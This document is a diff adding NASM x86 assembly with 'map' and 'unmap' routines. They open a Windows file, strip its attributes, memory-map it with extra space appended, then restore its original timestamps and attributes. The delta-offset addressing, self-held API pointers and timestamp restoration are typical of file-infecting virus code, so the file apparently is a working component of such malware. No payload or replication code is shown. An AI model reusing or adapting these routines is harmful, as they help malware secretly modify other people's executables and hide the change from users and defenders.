@@ -1,0 +1,165 @@
+;for NASM
+
+;add size
+;READWRITE/READONLY
+;name
+map:
+       pushad
+       call delta
+       mov esi, [esp+(8*4)+4]
+       push esi
+       lea edi, [ebp+filename]
+  .nextb:
+       lodsb
+       stosb
+       test al, al
+       jnz .nextb
+       pop esi
+       mov edi, [esp+(8*4)+8]
+       lea edi, [ebp+edi+table]
+       mov byte [ebp+.error_flag], 0f9h
+       lea eax, [ebp+DTAbuffer]
+       push eax
+       push esi
+       call [ebp+FindFirstFileA]
+       mov ecx, eax
+       inc ecx
+       jz near .done
+       push eax
+       call [ebp+FindClose]
+       cmp dword [esp+(8*4)+8], READONLY
+       je .zkipz
+       push dword 80h
+       push esi
+       call [ebp+SetFileAttributesA]
+  .zkipz:
+       sub eax, eax
+       xchg eax, esi
+       push esi
+       push dword 80h
+       push byte 3
+       push esi
+       push dword [edi+12]
+       push dword [edi]
+       push eax
+       call [ebp+CreateFileA]
+       mov [ebp+handle1], eax
+       inc eax
+       jz near .done0
+       mov eax, [esp+8*4+12]
+       mov ebx, [ebp+DTAbuffer+32]
+       cmp dword [esp+8*4+8], READWRITE
+       je .eax_has_it
+       sub eax, eax
+  .eax_has_it:
+       add ebx, eax
+       push esi
+       push ebx
+       push esi
+       push dword [edi+4]
+       push esi
+       push dword [ebp+handle1]
+       call [ebp+CreateFileMappingA]
+       mov [ebp+handle2], eax
+       test eax, eax
+       jz .done1
+       push ebx
+       push esi
+       push esi
+       push dword [edi+8]
+       push eax
+       call [ebp+MapViewOfFile]
+       mov [ebp+handle3], eax
+       test eax, eax
+       jz .done2
+       mov byte [ebp+.error_flag], 0f8h
+       jmp .done
+  .done:
+       popad
+  .error_flag:
+       stc
+       ret 12
+
+  .done2:
+       push dword [ebp+handle2]
+       call [ebp+CloseHandle]
+  .done1:
+       lea eax, [ebp+DTAbuffer+20]
+       push eax
+       sub eax, byte 8
+       push eax
+       sub eax, byte 8
+       push eax
+       push dword [ebp+handle1]
+       call [ebp+SetFileTime]
+       push dword [ebp+handle1]
+       call [ebp+CloseHandle]
+  .done0:
+       push dword [ebp+DTAbuffer]
+       lea eax, [ebp+filename]
+       push eax
+       call [ebp+SetFileAttributesA]
+       jmp .done
+
+unmap:
+       pushad
+       call delta
+       push dword [ebp+handle3]
+       call [ebp+UnmapViewOfFile]
+  .done2:
+       push dword [ebp+handle2]
+       call [ebp+CloseHandle]
+  .done1:
+%ifdef CUT_EXTRA
+       push byte 0
+       push byte 0
+       push dword [ebp+DTAbuffer+32]
+       push dword [ebp+handle1]
+       call [ebp+SetFilePointer]
+       push dword [ebp+handle1]
+       call [ebp+SetEndOfFile]
+%endif
+       lea eax, [ebp+DTAbuffer+20]
+       push eax
+       sub eax, byte 8
+       push eax
+       sub eax, byte 8
+       push eax
+       push dword [ebp+handle1]
+       call [ebp+SetFileTime]
+       push dword [ebp+handle1]
+       call [ebp+CloseHandle]
+  .done0:
+       push dword [ebp+DTAbuffer]
+       lea eax, [ebp+filename]
+       push eax
+       call [ebp+SetFileAttributesA]
+  .done:
+       popad
+       stc
+       ret
+
+[section .data]
+
+table:
+READWRITE equ 0
+       dd 0C0000000h
+       dd 4
+       dd 6
+       dd 0
+READONLY  equ 4*4
+       dd 080000000h
+       dd 2
+       dd 4
+       dd 1
+
+handle1 dd "****"
+handle2 dd 0
+handle3 dd 0
+
+filename times 200h db 0
+
+DTAbuffer times 200h db 0
+
+[section .text]
+
